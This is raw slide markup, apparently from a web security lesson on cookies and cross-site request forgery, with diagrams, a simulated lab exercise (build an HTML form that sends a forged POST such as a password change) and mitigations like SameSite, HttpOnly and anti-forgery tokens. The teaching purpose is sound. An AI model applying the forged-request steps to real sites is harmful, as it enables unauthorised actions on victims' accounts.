      </p:pic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461E26D6-A0C2-BD3B-4995-02CACE863F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3117603-D5B6-0AC9-671C-876FB001569D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959625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3EF3A-A5A1-478D-5020-71A15BE35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0083-4B8C-0AD8-4F85-42D360EE5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7C09D4-AB71-7656-95DD-A732CD378035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AC448C-41A6-F72D-6242-FB9062D33F3D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287CD-0517-CA62-32D2-DC60B6D70943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107EDB-1E4D-0E69-9949-83E9A9A369AD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79E92B-E374-B6B1-9392-C0918951DA39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F6D72F-0F07-D473-1150-E7CCE5885441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C1F8E1-4C3E-91DB-657C-7F73B5CF4920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and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{23E4E225-395C-68EF-407B-EC40D4B32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38" y="1354183"/>
            <a:ext cx="2074816" cy="2074816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A22354C-2A70-BC4C-A538-7ADF22C6D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1219201"/>
            <a:ext cx="1473200" cy="1473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A8A92716-7AEF-759B-CE63-F66BBF97B6A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="1246762"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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45B41E-5659-1C6F-0C6C-A0731B0F36DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6374674" y="1955801"/>
            <a:ext cx="3331029" cy="210343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9B82827E-6DBB-18DD-6E1C-AE0C8A873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2376" y="1704571"/>
            <a:ext cx="1975659" cy="1975659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B7507E5D-6DAD-2CCF-623A-E55F3FA79CE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="242744">
            <a:off x="7365276" y="1570767"/>
            <a:ext cx="1071470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Login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6326D05-1B4F-8CA2-169F-F3A464688B59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6374674" y="2572376"/>
            <a:ext cx="3343049" cy="120024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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F379D7A-3005-A79C-A9FC-1AC66261AB08}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21448141">
            <a:off x="6722421" y="2240677"/>
            <a:ext cx="1959174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Set-Cookie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62A8C4D-83B7-9332-CD82-A38DE4A15E51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6374674" y="3144592"/>
            <a:ext cx="3538993" cy="105172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BDEFC100-3A1B-7ED6-209C-AC03B38F9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331" y="2838390"/>
            <a:ext cx="779416" cy="6858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111E7A89-07A8-2D1F-DFB9-EA1D9F55B75C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="161441">
            <a:off x="6545565" y="3239238"/>
            <a:ext cx="2331005" cy="728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Future Requests</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 11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CFA6E80E-FF52-F064-1075-F5C4E8B2B4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0867" y="2917914"/>
            <a:ext cx="779416" cy="685800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BCD67E6-340E-C8AE-6426-F841D803CD16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3281304" y="4368929"/>
            <a:ext cx="7430239" cy="1134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All future requests to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> will send the cookie that was set by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com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BBD5DA6B-0787-D4E2-D53C-0093576DC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C3FABB0F-FD77-9D4B-F07F-0A485CB9A602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695525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C3764-3DE1-8E11-A128-DE155D63B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9DE2-1736-12DE-541C-B0F7764C0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672D0A-7E8A-AC6C-4B65-9E0FA9D30358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C57F32-467F-B327-BEBB-6696B66F7D5C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0EB0E6-93FF-E6F2-C735-2DA07DBC8F86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B28287-2FED-8FFC-FCAA-08B342604394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8D3E61-6EDE-46F1-33C3-C2CC29B86948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BF95E0-58E7-BFD4-A18E-BCC9DD4FDF75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BD934F-BD06-1932-34C4-3482C5ECA341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and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5599069E-0FE2-0209-8ED3-31417C1DA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38" y="1354183"/>
            <a:ext cx="2074816" cy="2074816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6BBE651-C2A6-FCD8-1230-6D515A698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1219201"/>
            <a:ext cx="1473200" cy="1473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8E8C8AED-8E2B-D77C-30A6-7215778E5082}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="1246762"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com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C86B0B2B-C9CB-BF40-83FA-D91D0ADC53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2376" y="1704571"/>
            <a:ext cx="1975659" cy="1975659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 11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DEE155D5-2A18-FD77-9692-5FA2E0CC7B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0867" y="2917914"/>
            <a:ext cx="779416" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Picture 15" descr="A pixel art of a green character holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E0F5B6B-0220-362E-70AF-F6409E0E87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0837965" y="5611238"/>
            <a:ext cx="1484295" cy="147320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802402E3-06A9-583F-623E-47A4C6C28140}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="3753614"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b.origin.com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6" name="Picture 25" descr="A white and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DB0D598-1BB7-F9D2-F705-4537CE7E8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389" y="3955322"/>
            <a:ext cx="2074816" cy="2074816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1C3033F-1389-9637-FF5A-76D4BA5E267E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6398919" y="4382828"/>
            <a:ext cx="3145682" cy="215764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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77C8DB1C-9D85-8D57-C2C1-380C22056821}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="242744">
            <a:off x="7021218" y="4035492"/>
            <a:ext cx="1774230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Visits Site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2E52D09-D80B-FA63-5911-F7782FEB4B70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6434409" y="5113858"/>
            <a:ext cx="3074464" cy="208367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2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66E4D5B6-2E02-F949-BA00-795010628485}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21343881">
            <a:off x="6784620" y="4738628"/>
            <a:ext cx="1774230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Frontend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="36" name="Graphic 35" descr="Database with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8D1CB15-CBCE-2CB6-2066-E076AF85E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4454" y="4246198"/>
            <a:ext cx="1975659" cy="1975659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14E08F87-F0DE-CBBA-9F2F-113ABB6D8C73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2773993" y="6198361"/>
            <a:ext cx="8063972" cy="573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Frontend has a hard-coded POST request to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com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565CCC65-EEF9-710F-2FFF-98FCBD0E10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1D74312-E372-46AC-58C1-E9DA4EDCE0C7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0124915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EDF02-9F10-1B12-1143-EBF6E878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88C0-793C-777F-D8E3-91461EE40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439B3-3D4E-0B64-47A8-574523AD0066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C8E779-0E55-1A59-96CF-CF86E0655077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F7DB30-E10B-D673-4187-5574A2B05AB2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FC04B1-5374-C62D-3A23-55EFD4864EE6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5BA273-36B6-C8DE-40DF-B7F29F5B58C7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561707-1179-720A-F608-82C09F296A1A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655BC8-AF37-2268-ABAC-AF78AB496680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B266E4-AE4A-12E4-CA6C-79FA82710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343" y="2166144"/>
            <a:ext cx="8771686" cy="43858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61F7E10B-DB46-DDB0-5910-1443C9E3353B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2914153" y="1592298"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b.origin.com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B0FD8364-F7FB-9C1C-99AE-07560880E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C8243D7-2702-60AD-C582-5204139A73AE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2877252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1FFA0-B099-0E05-FE19-B03FB30D0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3650-152D-E297-EBB6-CE1E37146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B11715-1A54-35D1-F39B-EE44061A055B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3CDC92-23A5-3642-4CD7-5F533FD161F3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77F6B5-3883-05B6-A7CC-D72A914417DD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1EDB8C-84B6-1D7B-5CE4-6E490677153F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BC3A9A-6D9A-D145-299C-E0D6580D8B3E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E2259B-C882-F127-1888-916C1CAC6AA3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725303-A2CD-3597-FBED-7F94E92D7BD6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and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1B3530A-6FA1-BE1D-2AC4-383E28F42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38" y="1354183"/>
            <a:ext cx="2074816" cy="2074816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C0518DC9-6CF4-FACD-1F06-B898CF1AC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1219201"/>
            <a:ext cx="1473200" cy="14732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A07A5157-AA23-8E03-6471-BCEBA072260A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="1246762"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com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E34B38AF-4A36-F775-96A8-1DE417DB82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2376" y="1704571"/>
            <a:ext cx="1975659" cy="1975659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 11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9B6CE0A5-D0A2-B734-31FB-C50FEFA2F1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0867" y="2917914"/>
            <a:ext cx="779416" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Picture 15" descr="A pixel art of a green character holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD75D57F-8B00-E7E2-0A8B-BA0EC04921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10837965" y="5611238"/>
            <a:ext cx="1484295" cy="147320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44AD7F54-CAE8-CCEC-C198-4EBAC5323591}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="3753614"/>
            <a:ext cx="2671764" cy="573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dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b.origin.com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6" name="Picture 25" descr="A white and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECCFCF49-3985-CFBC-B03B-D0B83EABB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389" y="3955322"/>
            <a:ext cx="2074816" cy="2074816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74F9D4-BA9C-4187-1203-8931EC581D37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6398919" y="4382828"/>
            <a:ext cx="3145682" cy="215764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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65363E56-EFDF-41A8-709A-2CFE5A919359}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="242744">
            <a:off x="7021218" y="4035492"/>
            <a:ext cx="1774230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Visits Site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084E2F-EAAE-0271-843D-BBA0F6E8D0C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6434409" y="5113858"/>
            <a:ext cx="3074464" cy="208367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2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{097BB36E-667F-0C31-58EB-DF9B8F351CBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21343881">
            <a:off x="6784620" y="4738628"/>
            <a:ext cx="1774230" cy="57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JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="36" name="Graphic 35" descr="Database with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAA28852-6CD7-5C16-82C3-2176DF1AA9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4454" y="4246198"/>
            <a:ext cx="1975659" cy="1975659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97FE4D29-AE5C-D3CA-F35D-8FA769AE8D46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2773993" y="6198361"/>
            <a:ext cx="8063972" cy="573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JavaScript has a hard-coded POST request to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com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43CC1E-A7DD-56B2-5925-DE5DA336536C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6398919" y="2692401"/>
            <a:ext cx="3411287" cy="1553797"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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pixelated moon with brown and white dots&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC979585-E257-0D66-F154-96B2153D5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4324" y="2625166"/>
            <a:ext cx="779416" cy="68580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E40FEED9-0D17-4CDF-11EB-90B6F0848549}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20170133">
            <a:off x="6161163" y="3268166"/>
            <a:ext cx="2827116" cy="573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Change Password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BB01F1E-6DB1-F2FC-EB5C-7CBFA2FBCADA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6630458" y="1869318"/>
            <a:ext cx="2413946" cy="10724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Cookie sent automatically</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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7808964-8D76-442F-6FB3-FAB2716BC2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BA21314-49C4-D5B3-3BD5-A7B05E411F56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967241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A5C45-D8D5-A60E-C512-A935EF64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3AD9C-4A7A-9DC2-7AA1-606C0447A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291481-72B7-44CE-F173-3340FF5A9A99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967DD2-44FE-BAA5-2570-D5FC773601B2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19CEC2-9DEF-FD83-62D4-2F49F2066C5F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BFAE3E-974F-DAD6-C024-7F51F7F2EA77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7748B5-7EC2-5281-7D8E-665D5C95284C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3171C6-383D-8782-634C-9EC8E478D6FB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4707103-06CC-4A0A-B44C-2AD5B6B8A077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1EE7395A-4CC9-BD7E-E9DA-CA0D27A2397B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2946733" y="1516621"/>
            <a:ext cx="8953530" cy="9522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Find a vulnerable POST request (or try any)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l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Create a HTML file that sends the request as a form</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/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7A8D45-39A1-BE82-83E2-DDC3207BE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53" y="2460899"/>
            <a:ext cx="8768502" cy="3079199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DC7926DD-34CD-5FD1-0EEC-5D806A423807}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2944353" y="5714998"/>
            <a:ext cx="8861015" cy="9522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l">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Open file in client’s browser (simulated step)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Check on client’s view if attack was successful</a:t>
            </a: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8ED2AC52-3182-0042-96FE-DB0A78C70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FD6F32B-C9F9-9480-0284-23002D90E9FE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541349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B0E0B-59BD-41A2-FB3C-D2673126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155D-64F3-13C6-09D3-342838227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16D5EC-585D-8DF5-1475-9F14602180E9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11A106-56F7-4353-700D-726885518532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FF8511-999C-9CB7-442E-C310D32FE76D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BBD18E-C1A7-6A2E-8C51-5DF850FCAAE7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D9C6A9-9715-56AD-E454-183961ECE8E1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29168A-5673-C91E-8123-7B91B874693C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D801C3-2B1B-8DBD-F277-6BF405FA20E1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210F7F8D-C383-34A6-03DA-3F5942DF6A45}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2946733" y="1516620"/>
            <a:ext cx="8953530" cy="511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Only applies in specific conditions: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POST/PUT Requests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Cookies are used for Auth (not a separate Authorization header)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Can be mitigated by using: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Cookie Parameter SameSite=Strict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Implement CSRF or Anti-Forgery Tokens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B9C53EF4-7CD9-E8A3-F2F1-8D93BC1DF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CB1DF02-3510-323B-86A7-2C812DFCC74C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549804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623A3-6B98-A05D-FF6E-058E8AE6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9B6C-50AC-0BF6-CBE0-624161FEB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Protecting Cookies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3F2078-C306-E3A9-E6E1-0929578F089A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7E0F95-EE14-524E-172E-5DEA3590DC48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34F531-9C22-F898-0C48-713547BECD0F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4CC7B6-8C1D-2BDF-D16C-A07D5590D22F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C0A2F4-464C-8E97-734F-17273FD25717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532AC1-A7BF-293E-7E26-AFA9C44FA340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6B8425-195F-BEE4-C1CA-3FDB9ADBB90B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AACEE920-4F05-9347-C873-B660BE8EEF9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2946733" y="1516620"/>
            <a:ext cx="8953530" cy="511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set-cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos Mono" panose="020B0009020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>authToken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=eyJhbGciOiJIUzI1NiIsInR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[…]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Max-Age=86400; Path=/; Expires=Sun, 01 Feb 2026 17:30:16 GMT;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HttpOnly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Secure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SameSite=Strict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5A49DDF1-134B-60A0-8866-C89DC480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AD01E309-F7E2-5959-1D5D-1B1CCD840702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1529124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13192-B518-123C-68FD-391BC35D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4D00-01AE-D538-BE9E-05B21F33D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Protecting Cookies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F49586-5DA0-DD35-466C-6857C1EADB8B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F58E95-4033-4863-E726-C64B42503196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194B95-1506-8A91-7FF5-D71248FED62E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F602A9-0FAF-746F-AE6B-B5CA2DCB95B4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286C87-0D63-6E28-7392-7F5868101B58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F6E17D-AD13-4748-78F1-034F906E4D36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EEDA2F-78CF-A79E-B65B-B43EBB9EDBFC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269E332D-A83E-7B56-DBDB-10E5800A277D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
